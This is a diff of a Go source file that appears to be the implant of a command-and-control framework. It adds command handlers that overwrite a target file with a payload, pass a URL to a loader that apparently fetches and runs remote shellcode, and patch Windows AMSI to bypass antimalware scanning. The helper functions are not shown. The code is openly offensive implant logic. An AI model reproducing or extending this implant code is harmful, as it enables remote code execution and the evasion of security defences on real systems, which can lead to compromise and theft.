@@ -1,3 +1,4 @@
+//main.go
 package main
 
 import (
@@ -1796,6 +1797,43 @@ func main() {
 	                go discoverHostsOnce.Do(func() {
                         discoverLocalHosts(lazyconf)
                     })
+                case strings.HasPrefix(command, "migrate:"):
+                    rest := strings.TrimPrefix(command, "migrate:")
+                    parts := strings.SplitN(rest, ",", 2)  // Máximo 2 partes
+
+                    targetPath := strings.TrimSpace(parts[0])
+                    var payloadPath string
+                    if len(parts) > 1 {
+                        payloadPath = strings.TrimSpace(parts[1])
+                    }
+
+                    go overWrite(targetPath, payloadPath)
+                    
+                case strings.HasPrefix(command, "shellcode:"):
+                    url := strings.TrimPrefix(command, "shellcode:")
+	                go executeLoader(url)
+
+                case strings.HasPrefix(command, "amsi:"):
+                        osName := runtime.GOOS
+                        switch osName {
+                        case "windows":
+                            if err := patchAMSI(); err != nil {
+                                fmt.Println(err)
+                            } else {
+                                if lazyconf.DebugImplant == "True" {
+                                    fmt.Println("AMSI bypass successful. Test with PowerShell or WMI scripts.")
+                                }
+                            }
+                        case "linux", "darwin":
+                            if lazyconf.DebugImplant == "True" {
+                                    fmt.Println("AMSI bypass is not implemented in linux/darwin systems.")
+                            }
+                        default:
+                            if lazyconf.DebugImplant == "True" {
+                                fmt.Println("AMSI bypass is not implemented in this system.")
+                            }
+                        }
+                    
                 case strings.HasPrefix(command, "adversary:"):
                     if err := handleAdversary(ctx, command, lazyconf, currentPortScanResults); err != nil {
                         if lazyconf.DebugImplant == "True" {
